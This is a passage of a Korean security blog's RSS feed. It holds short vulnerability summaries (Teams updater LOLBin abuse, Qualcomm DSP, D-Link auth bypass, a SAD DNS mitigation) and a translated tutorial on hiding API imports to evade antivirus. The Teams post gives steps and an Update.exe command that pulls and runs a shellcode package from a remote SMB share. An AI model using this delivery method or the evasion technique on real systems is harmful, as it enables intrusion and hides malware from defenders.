      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/">Microsoft Teams Updater Living off the Land</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Teams Updater</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams의 업데이트 프로그램을 lolbas(Living off the land binary and script)로 사용할 수 있습니다. 이전에 존재하던 code execution에 대한 취약점 수정은 URL을 통하여 업데이트 기능을 제한하는 것입니다. 하지만 업데이트 프로그램은 제품 업데이트를 위해 공유/로컬 폴더를 통한 로컬 연결이 가능합니다. 따라서 원격 SMB 공유 폴더를 통해 해당 패치를 우회할 수 있습니다.</p><p>이 취약점을 악용하기 위한 payload를 작성하는 단계는 다음과 같습니다.</p><ol><li><p><code>%localappdata%\Microsoft\Teams\packages</code>에서 Microsoft Teams pre-built package를 통해 nupkg 패키지 추출(ex. Teams-1.3.00.27559-full.nupkg)</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>에 shellcode를 <code>squirrel.exe</code> 파일로 넣은 후 압축</p></li><li><p>metadata 계산</p><p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p><p>output:</p><p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p></li><li><p><code>RELEASES</code> 파일을 생성한 후 위의 결과 값을 복사해서 저장</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg</code>와 <code>RELEASES</code> 파일을 메인 디렉터리에 넣고 원격 SMB 서버에 업로드</p></li></ol><p>피해자가 아래 명령어를 통해 해커의 원격 SMB 서버로 update를 진행하면 Microsoft Teams에 의해 다운로드되고 실행됩니다.</p><pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbin/">lolbin</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbas/">lolbas</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/teams/">teams</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Qualcomm DSP Achilles</title>
      <link>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/</link>
      <guid>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/</guid>
      <pubDate>Wed, 16 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.checkpoint.com/2020/08/06/achilles-small-chi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/#:~:text=One%20of%20the%20most%20common,the%20leading%20manufacturers%3A%20Qualcomm%20Technologies">Qualcomm DSP Achilles</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Qualcomm DSP chip</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint는 올해 Defcon에서 Achilles라는 연구 논문을 발표했습니다. Achilles는 Qualcomm DSP( Digital Signal Processor ) 칩에서 400개 이상의 취약점을 찾은 퍼징 기술 연구입니다. Qualcomm은 다양한 칩들을 생산하는 회사로, 스마트폰 시장의 40%가 Qualcomm의 칩을 사용하고 있기 때문에 Achilles에 주목해볼 필요가 있습니다.</p><p>DSP 칩들은 기본적으로 Black box로 관리되기 때문에, manufacturer가 아니라면 DSP 칩에 대한 정보가 제한적일 수밖에 없습니다. 이 칩을 사용해 스마트폰을 만드는 제조사도 예외는 아닙니다. Checkpoint는 black box 때문에 스마트폰 제조사들이 신속하게 이슈를 고치지 못하는 상황을 지적했습니다.</p><p>올해 5월 Zerodium이 ios exploit의 제보가 너무 많다는 이유로 구매 중지를 선언했습니다. Open source인 Android 보다 취약점 제보 건수가 많다는 것을 근거로 Closed source(black box)를 유지하던 ios의 보안성은 더 이상 효과 없다는 의견이 있습니다. ios 뿐만 아니라 모든 black box의 의미가 점점 희미해지고 있는 거 같습니다.</p><p>헤커들에겐 black box의 정보 폐쇄 효과는 점점 옅어지고, vendor 입장에선 이슈를 고치지 힘든 상황이 맞물려 Achilles 연구처럼 취약점이 뭉텅이로 나오는 일이 발생했다고 볼 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/qualcomm/">qualcomm</category>
      
      <category domain="https://hackyboiz.github.io/tags/dsp/">dsp</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-8863/8864 D-LINK ROUTER AUTHENTICATION BYPASSES</title>
      <link>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/</link>
      <guid>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/</guid>
      <pubDate>Tue, 15 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/9/30/the-anat</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses">THE ANATOMY OF A BUG DOOR: DISSECTING TWO D-LINK ROUTER AUTHENTICATION BYPASSES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-LINK router</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HNAP (Home Network Administration Protocol)는 Pure Networks Inc. 에서 개발 한 독점 SOAP 기반 프로토콜입니다. 현재는 이 프로토콜의 사용이 중단되었지만 여전히 업데이트되지 않은 많은 라우터들이 해당 프로토콜을 사용하고 있습니다.</p><p>HNAP에서 발견된 두 가지 취약점은 다음과 같습니다.</p><p>CVE-2020-8863은 <code>LoginPassword</code> 검증 과정에서 발생하는 authentication bypass 취약점입니다. <code>strncmp()</code> 에서 db 패스워드와 클라이언트가 입력한 <code>LoginPassword</code>를 <code>LoginPassword</code>의 size 만큼 비교하는데, 이때 <code>LoginPassword</code>에 빈 값을 전달하면 비교할 size가 0이 되어 무조건 인증에 성공하게 됩니다.</p><p>CVE-2020-8864는 HNAP PrivateLogin 인증 알고리즘의 잘못된 구현으로 인해 발생하는 authentication bypass 취약점입니다. HNAP를 통해 인증할 때 서버는 일반적으로 Private key를 사용자의 암호를 기반으로 생성합니다. 그러나 로그인 요청 중 <code>PrivateLogin</code> 필드에 “Username” 값을 넣어 요청하면 “Username”값으로 Private key를 생성해  실제 관리자 암호를 몰라도 인증 챌린지 값을 알 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/router/">router</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-door/">bug-door</category>
      
      <category domain="https://hackyboiz.github.io/tags/d-link/">d-link</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Windows Server DNS Resolver Spoofing 취약점 권고</title>
      <link>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/</link>
      <guid>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/</guid>
      <pubDate>Mon, 14 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://dirteam.com/sander/2020/12/10/dns-spoofing-vulner</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://dirteam.com/sander/2020/12/10/dns-spoofing-vulnerability-sad-dns-important-cve-2020-25705-adv200013/">Spoofing Vulnerability in DNS Resolver (SAD DNS, Important, CVE-2020-25705, ADV200013)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903</li><li>Windows Server, version 1909</li><li>Windows Server, version 2004</li><li>Windows Server, version 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020년 12월 8일에 마이크로소프트에서 DNS Resolver addressing spoofing 취약점에 대한 보안 공지(<a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200013">ADV200013</a>)가 발표됐습니다. 마이크로소프트는 해당 취약점을 통한 DNS cache poisoning attack을 막기 위해 DNS UDP 패킷의 크기를 제한하는 권고를 했습니다.</p><p>해당 취약점은 Windows TCP/IP stack에 제공되는 DNS Resolver Component에 존재합니다. DNS Resolver에 영향을 미치는 IP 조각화에 의해 DNS cache poisoning 취약점이 발생하며 해당 취약점을 exploit 한 해커는 DNS forwarder나 DNS Resolver에 의해 cache 된 DNS packet을 스푸핑 할 수 있습니다. 취약점을 성공적으로 exploit 하면 해커는 수정된 DNS record를 사용하여 해커의 웹사이트로 redirect 시킬 수 있습니다.</p><p>해당 취약점을 방지하기 위해 <code>MaximumUdpPacketSize</code> 레지스트리 값을 1,221 bytes로 수정해야 합니다. 수정된 후 DNS Resolver는 1,221 bytes보다 큰 모든 response를 TCP로 받아서 Windows Server 기반 DNS server에서 해당 취약점을 악용하려는 시도를 막을 수 있습니다.</p><p>DNS server가 실행되는 모든 Windows Server에서 관리자 권한 파워 쉘이나 원격 세션을 통한 아래의 명령줄을 실행하면 UDP 패킷 크기의 레지스트리 값을 변경할 수 있습니다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$RegPath</span> = <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Services\DNS\Parameters&quot;</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$RegPath</span> <span class="hljs-literal">-Name</span> MaximumUdpPacketSize `<span class="hljs-literal">-Value</span> <span class="hljs-number">1221</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span><span class="hljs-built_in">Restart-Service</span> DNS</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/sad-dns/">sad dns</category>
      
      <category domain="https://hackyboiz.github.io/tags/dns-cache-poisoning/">dns cache poisoning</category>
      
      <category domain="https://hackyboiz.github.io/tags/dns-resolver/">dns resolver</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-server/">windows server</category>
      
      <category domain="https://hackyboiz.github.io/tags/adv200013/">adv200013</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Engineering Antivirus evasion Part.2</title>
      <link>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/</link>
      <guid>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/</guid>
      <pubDate>Sun, 13 Dec 2020 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.&lt;/p&gt;
&lt;p&gt;저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이</description>
        
      
      
      
      <content:encoded><![CDATA[<p>저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.</p><p>저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이해가 안 되시는 부분이 있으시면 바로 지적해주시기 바랍니다!</p><blockquote><p>원문글 : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> 소프트웨어는 Windows 운영 체제와 상호 작용하기 위해 동적 링크 라이브러리(DLL)를 통해 함수를 가져온다. 이 함수들은 Import Address Table 테이블에 평문으로 작성되고 안티바이러스 소프트웨어는 이를 활용하여 악의적인 활동을 탐지한다. 우리는 Meterpreter를 중심으로 C/C++ 소프트웨어를 refactoring 하여 이러한 footprint를 제거할 수 있는 난독화 아이디어와 구현을 보여준다. 소스 코드는 <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>에서 확인할 수 있다.</p><h2 id="소개"><a href="#소개" class="headerlink" title="소개"></a>소개</h2><p>이전 글에서 정규식을 사용하지 않고 소스 코드에서 문자열 리터럴을 바꾸는 방법을 보여줬다. 바이너리의 footprint를 줄이고 정적 시그니처에 의존하는 보안 소프트웨어를 우회하는 것이 목적이다.</p><p>그러나 소스 코드의 문자열 리터럴 말고도 정적으로 수집하고 분석할 수 있는 정보들이 많다. 이 글은 바이너리에서 API import를 숨기는 방법과 C/C++로 작성된 모든 소프트웨어에서 그 작업을 자동화하는 방법에 대해서 다룰 것이다.</p><h2 id="API-imports의-문제점"><a href="#API-imports의-문제점" class="headerlink" title="API imports의 문제점"></a>API imports의 문제점</h2><p>간단한 C 프로그램을 아래와 같이 작성하고 빌드하자</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 가장 좋아하는 컴파일러로 빌드해라. MinGW는 <em>macOS</em>에서 <em>Windows</em>로 크로스 빌드를 하는 데 사용된다.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>그 후에 rabin2(radare2에 포함되어 있음) 또는 GNU strings 유틸리티를 사용하여 문자열을 리스트 할 수 있다.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   │ 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   │ 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 207   │ 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   │ 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   │ 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   │ 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   │ 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   │ 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   │ 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   │ 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   │ 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   │ 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   │ 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   │ 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>이 함수를 <code>User32.dll</code> 라이브러리에서 가져와야 하므로 MessageBoxA 문자열은 3번 나타난다.(뒤에서 자세히 설명)</p><p>MessageBoxA 문자열은 안티바이러스에서 감지되지 않지만 다음 API들은 감지될 것이다.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>…</li></ul><h2 id="API-imports-숨기기"><a href="#API-imports-숨기기" class="headerlink" title="API imports 숨기기"></a>API imports 숨기기</h2><p>윈도우 시스템에서 개발자들이 외부 라이브러리 함수를 호출하는 데 사용할 수 있는 방법들은 다음과 같다.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>외부 라이브러리 함수를 호출하는 기본적인 방법이며 링커에 의해 자동적으로 처리된다. 빌드 사이클 동안 애플리케이션은 각 동적 링크 라이브러리(DLL)의 import library(.lib)에 연결된다. 가져온 각 함수에 대해 링커는 DLL에 대한 내용을 IAT에 엔트리를 작성한다.</p><p>애플리케이션이 시작될 때, 운영체제는 IAT를 탐색하여 프로세스의 주소 공간에 있는 모든 라이브러리 리스트를 매핑하고 가져온 각 함수의 주소는 DLL의 Export Address Table에 해당 엔트리를 가리키도록 업데이트된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png"></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>다른 방법은 LoadLibrary로 해당 라이브러리를 로드한 후 GetProcAddress로 함수의 주소를 얻어 수동적으로 수행하는 것이다. 예를 들어 위의 예시를 run-time dynamic linking을 적용할 수 있다.</p><p>먼저 MessageBoxA API의 함수 포인터를 정의해야 한다. 시작하기 전에 C의 함수 포인터 구문에 대해 간단하게 설명한다.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>볼 수 있듯이 star operator(함수 포인터이므로)와  괄호를 제외하면 함수를 정의하는 구문과 같다.</p><p>이제 MessageBox의 프로토타입이 필요한데 Windows SDK의 <code>winuser.h</code> 혹은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>에서 찾을 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>앞서 말한 함수 포인터 구문은 정확한 정보로 업데이트할 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDN은 이 함수가 <code>User32.dll</code>에서 내보내진 다고 설명한다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png"></p><p>MessageBoxA API는 <code>User32.dll</code>에서 내보내 진다. 따라서 애플리케이션은 이 라이브러리를 먼저 로드해야 한다.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>그 후 <code>GetProcAddress</code>를 사용하여 위에서 정의한 함수 포인터에 정확한 주소를 할당할 수 있다.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>여기서 원래 예를 <code>MessageBoxA</code> 대신 <code>fMessageBoxA</code>를 호출하도록 수정해야 하며 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>HWND, LCTSTR, UINT</code> 데이터 타입을 위해 <code>Windows.h</code> include가 필요하다. 이 간단한 예제를 빌드하고 실행하면 예상대로 alert box가 실행된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png"></p><p>run-time dynamic linking을 하기 위해 <code>LoadLibrary</code>와 <code>GetProcAddress</code>을 사용하는 간단한 예시</p><h3 id="최종-적용"><a href="#최종-적용" class="headerlink" title="최종 적용"></a>최종 적용</h3><p><code>strings toto.exe</code>를 실행하면 아직 <code>User32.dll</code>과 <code>MessageBoxA</code> 문자열이 나타난다. 이 문자열들은 암호화되어야 하지만 이전 글에서 보여준 간단한 난독화 트릭으로 안티바이러스 탐지를 우회할 수 있다. 최종 결과는 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">char</span> user32[] = &#123;<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이번에는 <code>strings</code>와 <code>rabin2</code> 둘 다 문자열을 찾을 수 없다.</p><pre><code class="hljs cpp">➜  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe➜  strings /tmp/toto.exe | grep MessageBox➜  rabin2 -zz /tmp/toto.exe | grep MessageBox➜</code></pre><h2 id="자동화된-소스-코드-리팩터링"><a href="#자동화된-소스-코드-리팩터링" class="headerlink" title="자동화된 소스 코드 리팩터링"></a>자동화된 소스 코드 리팩터링</h2><p>이전 글에 설명된 것과 같은 방법으로 기존 코드 베이스를 refactoring 하여 의심스러운 API를 런타임에 로드하고 Import Address Table에서 제거할 수 있다. <code>libTooling</code>으로 구현된 기존의 작업을 기반으로 할 것이다.</p><p>이 작업을 다음과 같이 나열해보자.</p><ul><li>이전 예제의 추상 구문 트리를 생성해라. 함수 호출을 수정하기 위해 노드를 조작하는 방법을 이해하는데 필요하다.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>를 사용하여 지정된 API에 대한 API 코드 베이스의 모든 함수 호출을 찾아라.</li><li>다른 함수 식별자로 모든 호출을 대체해라.</li><li>각 함수 호출 전에 <code>LoadLibrary/GetProcAddress</code> 호출을 삽입하라.</li><li>작동하는지 확인해라.</li><li>모든 의심스러운 API를 종합하고 난독화해라.</li></ul><h3 id="MessageBox-애플리케이션의-추상-구문-트리"><a href="#MessageBox-애플리케이션의-추상-구문-트리" class="headerlink" title="MessageBox 애플리케이션의 추상 구문 트리"></a>MessageBox 애플리케이션의 추상 구문 트리</h3><p>원본 MessageBox 애플리케이션의 Clang 추상 구문 트리를 보기 위해 당신의 Windows SDK 경로를 적용하여 스크립트를 사용하자</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span 